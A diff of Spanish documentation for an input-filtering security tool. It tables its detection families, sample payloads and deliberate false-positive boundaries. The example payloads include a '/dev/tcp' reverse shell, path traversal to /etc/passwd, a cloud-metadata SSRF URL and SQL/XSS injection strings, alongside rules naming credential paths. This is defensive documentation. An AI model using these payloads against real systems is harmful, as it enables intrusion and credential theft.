@@ -31,11 +31,11 @@ valor para `disabled_rules`.
 
 | Familia | Qué detecta | Ejemplo de payload | Frontera: qué NO bloquea |
 |---|---|---|---|
-| `sqli` | UNION, tautologías, stacked queries, time/error-based, subconsultas, `xp_cmdshell` | `1 UNION SELECT password FROM users` | «union station», «order by date» sin número; `sleep(5)` en prosa (FP documentado benign-009) |
-| `xss` | Etiquetas, handlers de eventos, `javascript:` y `data:text/html`, iframes, entidades HTML numéricas y nombradas, esquemas con tab/NL (`java\tscript:`) | `<script>alert(1)</script>`, `&lt;script&gt;` | «javascript:» en prosa (FP documentado benign-012); etiquetas en búsquedas de documentación (benign-011) |
+| `sqli` | UNION, tautologías, stacked queries, time/error-based, subconsultas, `xp_cmdshell` | `1 UNION SELECT password FROM users` | «union station», «order by date» sin número; `union all` sin contexto de consulta detrás; `waitfor delay` sin literal de tiempo; `like null` sin cierre del payload; `sleep(5)` en prosa (FP documentado benign-009) |
+| `xss` | Etiquetas, handlers de eventos, `javascript:` y `data:text/html`, iframes, entidades HTML numéricas y nombradas, esquemas con tab/NL (`java\tscript:`) | `<script>alert(1)</script>`, `&lt;script&gt;` | «javascript:» en prosa (FP documentado benign-012); `<script>` **en prosa ya no bloquea**: solo salta con atributos, con etiqueta de cierre o seguido de algo que no puede ser prosa |
 | `path_traversal` | `../`, codificado (simple, doble, sobre-long UTF-8), rutas absolutas sensibles | `../../etc/passwd`, `..%c0%af..%c0%afetc/passwd` | `%2e%2e%2f` doblemente codificado en prosa (FP documentado benign-049) |
 | `sensitive_files` | Rutas que no deberían servirse nunca: `/etc/(passwd,shadow,group)`, `/proc/self`, `win.ini`, `.ssh/`, `.aws/`, `.docker/`, `.git/`, `.env`, `WEB-INF/` | `/home/user/.ssh/id_rsa` | «.env» suelto sin separador de ruta |
-| `nosql` | Operadores de inyección Mongo: `$ne`, `$nin`, `$where`, `$regex` (JSON o corchetes) | `user[$ne]=x`, `{"user": {"$ne": ""}}` | **`$gt`/`$lt`/`$in` quedan fuera a propósito**: los filtros legítimos pasados por HTTP (`{"price": {"$gt": 10}}`, benign-017/063) los usan. Si tu API expone filtros con `$ne`, desactiva la familia |
+| `nosql` | Operadores de inyección Mongo: `$ne`, `$nin`, `$where`, `$regex`, `$or`, `$exists`, **siempre dentro de un objeto JSON o de un parámetro** (`[$ne]`, `"$ne"`, `$ne=`) | `user[$ne]=x`, `{"user": {"$ne": ""}}` | **`$gt`/`$lt`/`$in` quedan fuera a propósito**: los filtros legítimos pasados por HTTP (`{"price": {"$gt": 10}}`, benign-017/063) los usan. Un operador citado en prosa (un tutorial de MongoDB) tampoco bloquea. Si tu API expone filtros con `$ne`, desactiva la familia |
 | `cmdi` | Separador shell + binario (`; ls`, `\| cat`, `&& whoami`, `$(id)`, `` `uname` ``), LOLBins de Windows (`powershell.exe`), webshells PHP (`;system('`) y funciones raras (`shell_exec(`), reverse shell `/dev/tcp/` | `; ls -la /tmp`, `bash -i >& /dev/tcp/10.0.0.1/4444` | Binarios sin separador delante («curl vs wget», benign-065); `;type=json` es separador de parámetros, no comando (benign-069); `eval(2+2)` en prosa sin separador |
 | `ssrf` | IPs de metadata cloud (AWS/GCP/Azure/Alibaba, IMDS y ECS) y esquemas de lectura local (`file://`, `gopher://`, `dict://`, `jar://`, `netdoc://`, `tftp://`) | `http://169.254.169.254/latest/meta-data/` | **`localhost` y `127.0.0.1` no se bloquean**: OAuth de desarrollo y webhooks locales son legítimos (benign-066). Una IP de loopback codificada en decimal sí es sospechosa |
 | `ssti` | Aritmética canónica de plantillas (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`) y acceso a objetos peligrosos (`config`, `self`, `request`, `__class__`, `__subclasses__`) | `{{config.items()}}` | `{{user.name}}` o `${HOME}` (plantillas de cliente y variables de entorno, benign-064/068) |
@@ -103,7 +103,7 @@ Esto no son carencias por arreglar: son las fronteras del diseño.
   los casos que deliberadamente no bloqueamos están medidos y en el informe.
 - **Los falsos positivos que aceptamos están listados** en
   [corpus/REPORT.md](https://github.com/Eche-Dev/Gatekeeper/blob/main/gatekeeper-v0.3/gatekeeper/corpus/REPORT.md)
-  con su motivo (hoy 5: texto técnico que cita el vector). Nada se esconde
+  con su motivo (hoy 8: texto técnico que cita el vector). Nada se esconde
   detrás de «0 FP».
 - **Las reglas personalizadas no están acotadas contra ReDoS** (las
   integradas sí); revisa tus patrones.
